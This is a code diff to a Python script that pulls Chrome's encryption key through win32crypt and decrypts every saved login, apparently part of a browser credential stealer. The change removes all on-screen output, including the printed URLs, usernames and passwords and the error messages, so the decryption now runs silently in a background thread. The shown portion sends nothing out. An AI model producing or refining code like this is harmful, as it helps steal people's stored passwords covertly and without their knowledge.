@@ -23,8 +23,6 @@ def get_secret_key():
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
     except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Chrome secretkey cannot be found")
         return None
 
 def fetch_data_from_local_db():
@@ -80,14 +78,7 @@ def get_and_decrypt_all_passwords():
             ciphertext= login[2]
             
             decrypted_pass = decrypt(ciphertext, secret_key)
-            
-            print("Url :", url)
-            print("Username : ", username)
-            print("Password : ", decrypted_pass)
-            print()
-    else:
-        print("You're safe...")
-        
+                    
 def run():
     # Start get_and_decrypt_all_passwords in a separate thread
     thread = threading.Thread(target=get_and_decrypt_all_passwords)
